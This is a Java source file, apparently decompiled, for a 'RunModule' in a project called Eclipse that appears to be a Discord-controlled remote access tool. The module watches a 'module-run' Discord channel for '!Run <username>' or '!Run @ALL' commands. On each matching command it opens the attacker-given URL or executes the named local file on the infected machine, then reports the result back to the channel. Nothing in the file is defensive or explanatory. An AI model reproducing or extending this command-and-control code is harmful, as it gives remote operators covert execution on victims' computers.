package me.Eclipse.Modules.Impl;

import java.awt.Color;
import java.awt.Desktop;
import java.io.File;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;

import me.Eclipse.Brain;
import me.Eclipse.Utils.Helper;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;

public class RunModule {

    public static void run(MessageReceivedEvent var0) {
        Message var1 = var0.getMessage();
        if (var1.getChannel().getName().contains("module-run")) {
            if (var1.getContentDisplay().startsWith("!Run " + Brain.Username) || var1.getContentDisplay().startsWith("!Run @ALL")) {
                String var2 = var1.getContentDisplay().replaceFirst("!Run " + Brain.Username + " ", "").replaceFirst("!Run @ALL ", "");
                URL var3 = null;
                if (var2.contains("http")) {
                    try {
                        var3 = new URL(var2);
                    } catch (MalformedURLException var6) {
                        Helper.sendMessage(Color.RED, "Module Run (" + Brain.Username + ")", "Could not open link.", var0);
                    }

                    assert var3 != null;

                    Helper.openURL(var3);
                    Helper.sendMessage(Color.GREEN, "Module Run (" + Brain.Username + ")", "Link `" + var2 + "` has been successfully opened.", var0);
                } else if ((new File(var2)).exists()) {
                    try {
                        Desktop.getDesktop().open(new File(var2));
                        if ((new File(var2)).isDirectory()) {
                            Helper.sendMessage(Color.GREEN, "Module Run (" + Brain.Username + ")", "Folder `" + var2 + "` has been successfully opened.", var0);
                        } else {
                            Helper.sendMessage(Color.GREEN, "Module Run (" + Brain.Username + ")", "File `" + var2 + "` has been successfully runned.", var0);
                        }
                    } catch (IOException var5) {
                        ;
                    }
                } else {
                    Helper.sendMessage(Color.RED, "Module Run (" + Brain.Username + ")", "File not found.", var0);
                }
            }

        }
    }
}
